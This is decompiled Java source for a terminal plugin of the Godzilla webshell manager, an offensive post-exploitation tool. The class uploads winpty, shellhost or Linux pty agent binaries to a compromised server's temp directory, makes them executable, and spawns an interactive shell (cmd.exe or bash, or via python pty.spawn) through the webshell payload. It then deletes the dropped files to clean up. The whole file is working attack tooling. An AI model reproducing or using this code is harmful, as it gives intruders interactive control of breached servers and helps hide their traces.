/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.generic;

import com.jediterm.terminal.Questioner;
import com.jediterm.terminal.TtyConnector;
import com.jediterm.terminal.ui.JediTermWidget;
import core.Encoding;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.dialog.AppSeting;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.Arrays;
import java.util.UUID;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import shells.plugins.generic.RealCmd;
import shells.plugins.generic.seting.SuperTerminalSeting;
import shells.plugins.generic.seting.TerminalSettingsProvider;
import util.Log;
import util.UiFunction;
import util.automaticBindClick;
import util.functions;

public abstract class SuperTerminal
implements Plugin {
    public static final String[] WINDOWS_PTY_COMMANDS = new String[]{"winShellhost cmd.exe", "winpty cmd.exe"};
    public static final String[] LINUX_PTY_COMMANDS = new String[]{"linpty bash"};
    private final String DLL_NAME_FORMAT = "winpty_x%d.dll";
    private final String AGENT_EXE = "winpty-agent.exe";
    private final String SHELLHOST_EXE = "shellhost-agent.exe";
    private final String[] PYTHON_NAMES = new String[]{"python", "python3", "python2"};
    private String[] tempFileName;
    private JPanel panel = new JPanel(new BorderLayout());
    private JediTermWidget terminal;
    private JButton StartButton;
    private JButton StopButton;
    private JLabel pollingSleepLabel = new JLabel("polling Sleep(ms)");
    private JLabel execFileLabel = new JLabel("exec command");
    private JComboBox execFileTextField;
    private JTextField pollingSleepTextField;
    private JSplitPane realSplitPane;
    private boolean ptyInited;
    protected ShellEntity shellEntity;
    protected Payload payload;
    protected Encoding encoding;
    private boolean isRuning;
    private ByteArrayOutputStream bufferByteArrayOutputStream;
    private Integer sleepTime;
    private RealCmd realCmd;
    protected String realCmdCommand;

    public SuperTerminal() {
        this.StartButton = new JButton("Start");
        this.StopButton = new JButton("Stop");
        this.terminal = new JediTermWidget(new TerminalSettingsProvider());
        this.pollingSleepTextField = new JTextField("1000", 7);
        this.execFileTextField = new JComboBox<String>(new String[0]);
        this.realSplitPane = new JSplitPane();
        this.realSplitPane.setOrientation(0);
        this.realSplitPane.setDividerSize(0);
        this.execFileTextField.setEditable(true);
        JPanel realTopPanel = new JPanel();
        realTopPanel.add(this.pollingSleepLabel);
        realTopPanel.add(this.pollingSleepTextField);
        realTopPanel.add(this.execFileLabel);
        realTopPanel.add(this.execFileTextField);
        realTopPanel.add(this.StartButton);
        realTopPanel.add(this.StopButton);
        this.realSplitPane.setTopComponent(realTopPanel);
        this.realSplitPane.setBottomComponent(new JScrollPane(this.terminal));
        this.sleepTime = new Integer(this.pollingSleepTextField.getText());
        this.terminal.getTerminal().writeCharacters("The next generation of webshell powerful Godzilla");
        this.terminal.getTerminal().nextLine();
        this.panel.add(this.realSplitPane);
    }

    protected synchronized void StartButtonClick(ActionEvent actionEvent) throws IOException {
        this.load();
        String tmpCommand = this.execFileTextField.getSelectedItem().toString().trim();
        String[] commandArray = functions.SplitArgs(tmpCommand);
        if (Arrays.stream(WINDOWS_PTY_COMMANDS).anyMatch(cmd -> cmd.startsWith(commandArray[0])) || Arrays.stream(LINUX_PTY_COMMANDS).anyMatch(cmd -> cmd.startsWith(commandArray[0]))) {
            if (!this.loadPty(tmpCommand)) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "\u521d\u59cb\u5316Pty\u5931\u8d25!!!");
                return;
            }
        } else {
            this.realCmdCommand = tmpCommand;
        }
        if (this.realCmdCommand == null) {
            this.realCmdCommand = tmpCommand;
        }
        InetSocketAddress socketAddress = this.realCmd.startRealCmd(0, "127.0.0.1", this.realCmdCommand, 500);
        try {
            if (socketAddress != null) {
                Socket socket = new Socket();
                socket.connect(socketAddress, 2000);
                this.terminal.setTtyConnector(new LoggingPtyProcessTtyConnector(socket));
                this.terminal.start();
            } else {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "\u672a\u80fd\u521b\u5efaRealCmd\u670d\u52a1");
            }
        } catch (Exception e) {
            this.terminal.stop();
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), e.getMessage());
        }
    }

    protected void StopButtonClick(ActionEvent actionEvent) {
        this.terminal.stop();
        this.realCmd.StopButtonClick(null);
        if (this.tempFileName != null) {
            Arrays.stream(this.tempFileName).forEach(fileName -> this.payload.deleteFile((String)fileName));
        }
        this.tempFileName = null;
    }

    protected void load() {
        if (this.realCmd == null) {
            this.realCmd = this.getRealCmd();
        }
    }

    @Override
    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(SuperTerminal.class, this, SuperTerminal.class, this);
        this.execFileTextField.removeAllItems();
        if (this.payload.isWindows()) {
            Arrays.stream(WINDOWS_PTY_COMMANDS).forEach(cmd -> this.execFileTextField.addItem(cmd));
        } else {
            Arrays.stream(LINUX_PTY_COMMANDS).forEach(cmd -> this.execFileTextField.addItem(cmd));
        }
    }

    @Override
    public JPanel getView() {
        return this.panel;
    }

    public abstract RealCmd getRealCmd();

    private synchronized boolean loadPty(String command) {
        if (!this.ptyInited) {
            try {
                if (command.startsWith("winpty")) {
                    if (this.winptyInit(command)) {
                        this.ptyInited = true;
                    }
                } else if (command.startsWith("linpty")) {
                    if (this.linptyInit(command)) {
                        this.ptyInited = true;
                    }
                } else if (command.startsWith("winShellhost") && this.winshellhostInit(command)) {
                    this.ptyInited = true;
                }
            } catch (Exception e) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), e.getMessage());
                Log.error(e);
            }
        }
        return this.ptyInited;
    }

    protected String getTempDirectory() {
        return this.payload.getTempDirectory();
    }

    public boolean linptyInit(String tmpCommand) {
        String pythonName = null;
        for (int i = 0; i < this.PYTHON_NAMES.length; ++i) {
            try {
                Log.log("\u6b63\u5728\u67e5\u627e%s\u89e3\u91ca\u5668", this.PYTHON_NAMES[i]);
                String result = this.payload.execCommand(String.format("%s -c 'print(701111+6368)'", this.PYTHON_NAMES[i]));
                if (result == null || result.indexOf("707479") == -1) continue;
                pythonName = this.PYTHON_NAMES[i];
                break;
            } catch (Exception e) {
                Log.error(e);
            }
        }
        if (pythonName == null) {
            String fileName = this.getTempDirectory() + "pty-" + UUID.randomUUID().toString().replace("-", "");
            Log.log("\u672a\u627e\u5230Python\u89e3\u91ca\u5668 \u6b63\u5728\u4e0a\u4f20linuxPty  RemoteFile->%s", fileName);
            if (this.payload.uploadFile(fileName, functions.readInputStreamAutoClose(SuperTerminal.class.getResourceAsStream("assets/linuxpty")))) {
                this.payload.execCommand(String.format("chmod +x %s", fileName));
                String[] commands = functions.SplitArgs(tmpCommand);
                this.realCmdCommand = String.format("%s \"%s\"", fileName, commands[1]);
                this.tempFileName = new String[]{fileName};
                Log.log("LinuxPty \u6d3e\u751f\u547d\u4ee4->%s", this.realCmdCommand);
                return true;
            }
        } else {
            String[] commands = functions.SplitArgs(tmpCommand);
            this.realCmdCommand = String.format("python -c 'import pty; pty.spawn(\"%s\")'\n", commands[1]);
            Log.log("\u5df2\u627e\u5230Python\u89e3\u91ca\u5668 \u89e3\u91ca\u5668\u540d->%s \u6d3e\u751f\u547d\u4ee4->%s", pythonName, this.realCmdCommand);
            return true;
        }
        return false;
    }

    public boolean winptyInit(String tmpCommand) throws Exception {
        String dllName = "winpty_x%d.dll";
        dllName = String.format(dllName, this.payload.isX64() ? 64 : 32);
        File dllFile = new File(SuperTerminal.class.getResource("assets/" + dllName).toURI());
        File exeFile = new File(SuperTerminal.class.getResource("assets/winpty-agent.exe").toURI());
        String fullDLLPath = this.getTempDirectory() + dllName;
        String fullEXEPath = this.getTempDirectory() + "winpty-agent.exe";
        if (this.payload.getFileSize(fullDLLPath) <= 0) {
            if (!this.shellEntity.getFrame().getShellFileManager().uploadBigFile(fullDLLPath, dllFile)) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "\u4e0a\u4f20Winpty\u63d2\u4ef6\u5931\u8d25", "\u9519\u8bef", 0);
                return false;
            }
        } else {
            Log.log("\u5df2\u6709winpty dll \u65e0\u9700\u518d\u6b21\u4e0a\u4f20", new Object[0]);
        }
        if (this.payload.getFileSize(fullEXEPath) <= 0) {
            if (!this.shellEntity.getFrame().getShellFileManager().uploadBigFile(fullEXEPath, exeFile)) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "\u4e0a\u4f20Winpty agent\u5931\u8d25", "\u9519\u8bef", 0);
                return false;
            }
        } else {
            Log.log("\u5df2\u6709winpty agent \u65e0\u9700\u518d\u6b21\u4e0a\u4f20", new Object[0]);
        }
        this.tempFileName = new String[]{fullEXEPath, fullDLLPath};
        this.realCmdCommand = tmpCommand;
        return true;
    }

    public boolean winshellhostInit(String tmpCommand) throws Exception {
        File exeFile = new File(SuperTerminal.class.getResource("assets/shellhost-agent.exe").toURI());
        String fullEXEPath = this.getTempDirectory() + "shellhost-agent.exe";
        if (this.payload.getFileSize(fullEXEPath) <= 0) {
            if (!this.shellEntity.getFrame().getShellFileManager().uploadBigFile(fullEXEPath, exeFile)) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "\u4e0a\u4f20shellhost agent\u5931\u8d25", "\u9519\u8bef", 0);
                return false;
            }
        } else {
            Log.log("\u5df2\u6709shellhost agent \u65e0\u9700\u518d\u6b21\u4e0a\u4f20", new Object[0]);
        }
        String executeFile = functions.SplitArgs(tmpCommand)[1];
        this.realCmdCommand = fullEXEPath + " ---pty " + executeFile;
        this.tempFileName = new String[]{fullEXEPath};
        return true;
    }

    static {
        AppSeting.registerPluginSeting("\u8d85\u7ea7\u7ec8\u7aef", SuperTerminalSeting.class);
    }

    public static class LoggingPtyProcessTtyConnector
    implements TtyConnector {
        private Socket socket;
        private BufferedReader bufferedReader = null;
        private BufferedWriter bufferedWriter = null;
        private OutputStream outputStream = null;

        public LoggingPtyProcessTtyConnector(Socket socket) {
            this.socket = socket;
            try {
                this.bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                this.outputStream = socket.getOutputStream();
                this.bufferedWriter = new BufferedWriter(new OutputStreamWriter(this.outputStream));
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        @Override
        public boolean init(Questioner q) {
            return this.socket.isConnected();
        }

        @Override
        public void close() {
            try {
                this.socket.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        @Override
        public String getName() {
            return this.toString();
        }

        @Override
        public int read(char[] buf, int offset, int length) throws IOException {
            int len = this.bufferedReader.read(buf, offset, length);
            return len;
        }

        @Override
        public void write(String string) throws IOException {
            this.bufferedWriter.write(string);
            this.bufferedWriter.flush();
        }

        @Override
        public int waitFor() throws InterruptedException {
            return 0;
        }

        @Override
        public void write(byte[] bytes) throws IOException {
            this.outputStream.write(bytes);
            this.outputStream.flush();
        }

        @Override
        public boolean isConnected() {
            return this.socket.isConnected();
        }
    }
}

